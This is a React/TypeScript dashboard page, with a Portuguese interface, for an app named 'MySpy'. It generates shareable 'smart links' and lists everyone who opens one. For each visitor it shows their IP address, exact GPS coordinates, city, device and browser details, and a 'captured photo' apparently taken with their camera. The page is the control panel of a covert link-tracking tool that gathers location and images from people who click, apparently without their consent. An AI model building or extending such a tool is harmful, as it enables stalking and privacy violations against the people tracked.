import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Link, Copy, LogOut, Clock, MapPin, Smartphone, Camera } from 'lucide-react';
import Button from '../components/Button';
import AnimatedBackground from '../components/AnimatedBackground';
import { useAuth } from '../contexts/AuthContext';
import { generateLink, getLinkAccesses } from '../services/linkService';

interface LinkAccess {
  linkId: string;
  timestamp: number;
  ip?: string;
  location?: {
    latitude: number;
    longitude: number;
    country?: string;
    countryCode?: string;
    city?: string;
  };
  device?: {
    type: string;
    os: string;
    browser: string;
    screenResolution: string;
  };
  photo?: string;
}

const Dashboard: React.FC = () => {
  const [generatedLink, setGeneratedLink] = useState('');
  const [copySuccess, setCopySuccess] = useState(false);
  const [linkAccesses, setLinkAccesses] = useState<LinkAccess[]>([]);
  const [loading, setLoading] = useState(false);
  const [selectedAccess, setSelectedAccess] = useState<LinkAccess | null>(null);
  
  const { currentUser, logout } = useAuth();
  const navigate = useNavigate();
  
  useEffect(() => {
    if (!currentUser) {
      navigate('/login');
      return;
    }
    
    // Get link accesses for the current user
    getLinkAccesses(currentUser.uid, (accesses) => {
      setLinkAccesses(accesses);
    });
  }, [currentUser, navigate]);
  
  const handleGenerateLink = async () => {
    if (!currentUser) return;
    
    setLoading(true);
    try {
      const link = await generateLink(currentUser.uid);
      setGeneratedLink(link);
      setCopySuccess(false);
    } catch (error) {
      console.error('Error generating link:', error);
    } finally {
      setLoading(false);
    }
  };
  
  const handleCopyLink = () => {
    navigator.clipboard.writeText(generatedLink).then(() => {
      setCopySuccess(true);
      setTimeout(() => setCopySuccess(false), 3000);
    });
  };
  
  const handleLogout = async () => {
    await logout();
    navigate('/');
  };
  
  const formatDate = (timestamp: number) => {
    return new Date(timestamp).toLocaleString();
  };

  const getFlagEmoji = (countryCode?: string) => {
    if (!countryCode) return '🌐';
    const codePoints = countryCode
      .toUpperCase()
      .split('')
      .map(char => 127397 + char.charCodeAt(0));
    return String.fromCodePoint(...codePoints);
  };
  
  return (
    <div className="min-h-screen text-white">
      <AnimatedBackground />
      
      <div className="container mx-auto px-4 py-8">
        {/* Header */}
        <header className="flex justify-between items-center py-4 mb-8">
          <div className="flex items-center">
            <Link className="w-8 h-8 text-indigo-400" />
            <span className="ml-2 text-xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-indigo-400 to-purple-300">
              MySpy Dashboard
            </span>
          </div>
          
          <Button 
            primary={false} 
            onClick={handleLogout}
            className="flex items-center"
          >
            <LogOut className="w-4 h-4 mr-2" />
            Sair
          </Button>
        </header>
        
        {/* Welcome section */}
        <section className="bg-gray-900 bg-opacity-60 rounded-xl p-6 backdrop-blur-sm border border-indigo-900 mb-8">
          <h1 className="text-2xl font-bold mb-2">
            Bem-vindo, {currentUser?.displayName || 'Usuário'}!
          </h1>
          <p className="opacity-80">
            Gerencie seus links inteligentes e acompanhe todas as interações em tempo real.
          </p>
        </section>
        
        {/* Generate Link Section */}
        <section className="bg-gray-900 bg-opacity-60 rounded-xl p-6 backdrop-blur-sm border border-indigo-900 mb-8">
          <h2 className="text-xl font-semibold mb-4">Gerar Link Inteligente</h2>
          
          <div className="flex flex-col md:flex-row md:items-end gap-4">
            <div className="flex-grow">
              <Button
                onClick={handleGenerateLink}
                className="w-full md:w-auto flex items-center justify-center"
                disabled={loading}
              >
                <Link className="w-5 h-5 mr-2" />
                {loading ? 'Gerando...' : 'Gerar Link Inteligente'}
              </Button>
            </div>
            
            {generatedLink && (
              <div className="flex-grow">
                <div className="relative">
                  <input
                    type="text"
                    value={generatedLink}
                    readOnly
                    className="w-full px-3 py-3 bg-gray-800 bg-opacity-70 border border-gray-700 text-white rounded-lg focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 pr-12"
                  />
                  <button
                    onClick={handleCopyLink}
                    className="absolute right-2 top-1/2 transform -translate-y-1/2 text-indigo-400 hover:text-indigo-300 transition-colors"
                    title="Copiar link"
                  >
                    <Copy className="w-5 h-5" />
                  </button>
                </div>
                {copySuccess && (
                  <p className="text-green-400 text-sm mt-1">Link copiado com sucesso!</p>
                )}
              </div>
            )}
          </div>
        </section>
        
        {/* Link Interactions Section */}
        <section className="bg-gray-900 bg-opacity-60 rounded-xl p-6 backdrop-blur-sm border border-indigo-900">
          <h2 className="text-xl font-semibold mb-4">Histórico de Interações</h2>
          
          {linkAccesses.length === 0 ? (
            <div className="text-center py-8 text-gray-400">
              <p>Nenhuma interação registrada ainda.</p>
              <p className="mt-2 text-sm">Gere um link e compartilhe para começar a monitorar.</p>
            </div>
          ) : (
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              {/* Interactions List */}
              <div className="overflow-y-auto max-h-[600px] pr-4">
                {linkAccesses.map((access, index) => (
                  <div
                    key={index}
                    className={`bg-gray-800 bg-opacity-50 rounded-lg p-4 mb-4 cursor-pointer transition-all hover:bg-opacity-70 ${
                      selectedAccess === access ? 'ring-2 ring-indigo-500' : ''
                    }`}
                    onClick={() => setSelectedAccess(access)}
                  >
                    <div className="flex items-center justify-between mb-2">
                      <div className="flex items-center">
                        <Clock className="w-4 h-4 mr-2 text-indigo-400" />
                        <span className="text-sm">{formatDate(access.timestamp)}</span>
                      </div>
                      {access.location?.countryCode && (
                        <span className="text-2xl" title={access.location.country || ''}>
                          {getFlagEmoji(access.location.countryCode)}
                        </span>
                      )}
                    </div>
                    
                    <div className="flex items-center text-sm text-gray-300 mb-2">
                      <Smartphone className="w-4 h-4 mr-2 text-indigo-400" />
                      {access.device?.type} - {access.device?.os}
                    </div>
                    
                    {access.location?.city && (
                      <div className="flex items-center text-sm text-gray-300">
                        <MapPin className="w-4 h-4 mr-2 text-indigo-400" />
                        {access.location.city}, {access.location.country}
                      </div>
                    )}
                  </div>
                ))}
              </div>
              
              {/* Selected Access Details */}
              {selectedAccess && (
                <div className="bg-gray-800 bg-opacity-50 rounded-lg p-6">
                  <h3 className="text-lg font-semibold mb-4">Detalhes da Interação</h3>
                  
                  {selectedAccess.photo && (
                    <div className="mb-6">
                      <div className="flex items-center mb-2">
                        <Camera className="w-4 h-4 mr-2 text-indigo-400" />
                        <span className="text-sm font-medium">Foto Capturada</span>
                      </div>
                      <img
                        src={selectedAccess.photo}
                        alt="Captured"
                        className="w-full rounded-lg border border-gray-700"
                      />
                    </div>
                  )}
                  
                  <div className="space-y-4">
                    <div>
                      <h4 className="text-sm font-medium text-gray-300 mb-1">Data e Hora</h4>
                      <p className="text-sm">{formatDate(selectedAccess.timestamp)}</p>
                    </div>
                    
                    <div>
                      <h4 className="text-sm font-medium text-gray-300 mb-1">Dispositivo</h4>
                      <p className="text-sm">
                        {selectedAccess.device?.type} - {selectedAccess.device?.os}
                        <br />
                        {selectedAccess.device?.browser} ({selectedAccess.device?.screenResolution})
                      </p>
                    </div>
                    
                    {selectedAccess.location && (
                      <div>
                        <h4 className="text-sm font-medium text-gray-300 mb-1">Localização</h4>
                        <p className="text-sm">
                          {selectedAccess.location.city}, {selectedAccess.location.country}
                          <br />
                          Coordenadas: {selectedAccess.location.latitude.toFixed(4)}, {selectedAccess.location.longitude.toFixed(4)}
                        </p>
                      </div>
                    )}
                    
                    {selectedAccess.ip && (
                      <div>
                        <h4 className="text-sm font-medium text-gray-300 mb-1">Endereço IP</h4>
                        <p className="text-sm">{selectedAccess.ip}</p>
                      </div>
                    )}
                  </div>
                </div>
              )}
            </div>
          )}
        </section>
      </div>
    </div>
  );
};

export default Dashboard;